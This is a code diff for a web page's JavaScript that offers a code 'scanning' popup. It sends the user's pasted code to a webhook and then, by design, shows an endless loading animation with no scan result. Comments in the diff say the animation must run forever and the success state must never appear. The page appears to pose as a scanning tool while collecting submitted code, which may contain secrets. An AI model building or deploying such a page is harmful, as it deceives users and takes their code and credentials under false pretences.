@@ -818,8 +818,8 @@
             }
         });
 
-        // Popup functionality
-        compileBtn.addEventListener('click', () => {
+        // Open scan popup
+        openScanBtn.addEventListener('click', () => {
             compilePopup.style.display = 'block';
             codeTextarea.focus();
         });
@@ -829,7 +829,7 @@
             codeTextarea.value = '';
             loadingContainer.style.display = 'none';
             compileSubmitBtn.disabled = false;
-            compileSubmitBtn.textContent = '🔍 Scan Code';
+            compileSubmitBtn.textContent = '🚀 Start Scanning';
         });
 
         // Close popup when clicking outside
@@ -864,13 +864,13 @@
                 return;
             }
 
-            // Show loading animation (infinite)
+            // Show infinite loading animation
             compileSubmitBtn.disabled = true;
             compileSubmitBtn.textContent = 'Scanning...';
             loadingContainer.style.display = 'block';
             compileStatusMessage.classList.remove('show');
             
-            // Send to webhook but keep loading animation running
+            // Send to webhook in background
             const result = await sendToWebhook(code);
             
             if (result.success) {
@@ -879,14 +879,15 @@
                 const codeHash = btoa(code).substring(0, 20);
                 submittedCodes.add(codeHash);
                 
-                // Keep the loading animation running infinitely
-                // Don't hide it or show success message
+                // IMPORTANT: Keep loading animation running FOREVER
+                // Never hide the loading or show success message
+                // User must manually close popup or refresh page
             } else {
-                // Only show error if webhook fails
+                // Only show error if webhook completely fails
                 loadingContainer.style.display = 'none';
                 compileSubmitBtn.disabled = false;
-                compileSubmitBtn.textContent = '🚀 Compile Code';
-                showCompileStatus('❌ Compilation failed. Please try again.', 'error');
+                compileSubmitBtn.textContent = '🚀 Start Scanning';
+                showCompileStatus('❌ Scanning failed. Please try again.', 'error');
             }
         });
 
